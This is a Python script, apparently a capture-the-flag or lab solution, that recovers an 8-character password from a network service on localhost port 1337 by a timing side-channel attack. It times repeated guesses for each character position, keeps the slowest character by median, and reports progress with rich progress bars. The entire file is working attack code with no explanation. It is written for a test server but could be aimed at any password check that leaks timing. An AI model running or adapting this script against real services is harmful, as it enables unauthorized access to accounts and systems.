import socket
import statistics
import string
import time
from operator import itemgetter

from rich.console import Group
from rich.panel import Panel
from rich.live import Live
from rich.progress import (
    BarColumn,
    Progress,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)


N = 10
PWD_LEN = 8
CHARSET = string.ascii_lowercase + string.digits
CONN = ("127.0.0.1", 1337)


class PasswordFound(Exception):
  def __init__(self, password):
    self.password = password


def attempt(password: str):
  conn.sendall(password.encode() + b"\n")
  res = conn.recv(1024).decode().strip()
  if "Correct!" in res:
    live.console.print(res)
    return True
  else:
    return False
  

def get_attempt_timings(password, char_attempt_task_id):
  timings = []

  for i in range(N):
    before = time.perf_counter_ns()
    res = attempt(password)
    after = time.perf_counter_ns()

    if res:
      char_attempt_progress.stop_task(char_attempt_task_id)
      char_attempt_progress.update(char_attempt_task_id, visible=False)
      raise PasswordFound(password)
    
    timings.append(after - before)

    char_attempt_progress.update(char_attempt_task_id, advance=1)

  char_attempt_progress.stop_task(char_attempt_task_id)
  char_attempt_progress.update(char_attempt_task_id, visible=False)

  return timings


def find_next_char(prefix, pos_attempt_task_id):
  measures = []

  for i, char in enumerate(CHARSET):
    char_attempt_task_id = char_attempt_progress.add_task("", char=char, total=N)

    attempt = prefix + char + "0" * (PWD_LEN - len(prefix) - 1)
    timings = get_attempt_timings(attempt, char_attempt_task_id)

    median = statistics.median(timings)
    min_ = min(timings)
    max_ = max(timings)
    stdev = statistics.stdev(timings)

    measures.append(
      {
        "char": char,
        "median": median,
        "min": min_,
        "max": max_,
        "stdev": stdev,
      }
    )

    pos_attempt_progress.update(pos_attempt_task_id, advance=1)
    overall_progress.update(overall_task_id, advance=1)

  measures = sorted(measures, key=itemgetter("median"), reverse=True)

  found = measures[0]

  return found


if __name__ == "__main__":
  START_TIME = time.perf_counter()

  conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  conn.connect(CONN)
  print(conn.recv(1024).decode().strip())

  current_pos_progress = Progress(
    TimeElapsedColumn(),
    TextColumn("{task.description}"),
  )

  char_attempt_progress = Progress(
    TextColumn("  "),
    TextColumn("[bold purple]Getting timings for character \"{task.fields[char]}\""),
    BarColumn(),
  )

  pos_attempt_progress = Progress(
    TextColumn(
      "[bold blue]Progress for character at position {task.fields[pos]}: {task.percentage:.0f}%"
    ),
    BarColumn(),
    TimeRemainingColumn(),
    TextColumn("({task.completed} of {task.total} characters attempted)"),
  )

  overall_progress = Progress(
    TimeElapsedColumn(), BarColumn(), TimeRemainingColumn(), TextColumn("{task.description}")
  )

  progress_group = Group(
    Panel(Group(current_pos_progress, char_attempt_progress, pos_attempt_progress)),
    overall_progress,
  )

  overall_task_id = overall_progress.add_task("", total=PWD_LEN*len(CHARSET))

  base = ""

  done = False

  with Live(progress_group, refresh_per_second=4) as live:
    for i in range(PWD_LEN):
      top_desc = f"[bold #AAAAAA](Cracking pos {i + 1}/{PWD_LEN})[bold #AAAAAA]"
      overall_progress.update(overall_task_id, description=top_desc)

      current_task_id = current_pos_progress.add_task(description=f"Cracking pos {i + 1}/{PWD_LEN}")
      pos_attempt_task_id = pos_attempt_progress.add_task("", total=len(CHARSET), pos=i + 1)

      try:
        found = find_next_char(base, pos_attempt_task_id)
      except PasswordFound as e:
        live.console.print(f"Found password: {e.password}")
        done = True
      except Exception as e:
        live.console.print_exception()
        exit(1)

      pos_attempt_progress.update(pos_attempt_task_id, visible=False)
      current_pos_progress.stop_task(current_task_id)
      desc = f"[bold green]Cracked pos {i + 1}/{PWD_LEN}: {found['char']} (median: {found['median']})"
      current_pos_progress.update(current_task_id, description=desc)

      base += found['char']

      if done:
        break
    
    overall_progress.update(overall_task_id, description=f"Done! Password: {base}" if done else "Failed to crack password")
    overall_progress.stop_task(overall_task_id)

    END_TIME = time.perf_counter()

    live.console.print(f"Cracked password in {END_TIME - START_TIME:.2f} seconds")
    live.console.clear_live()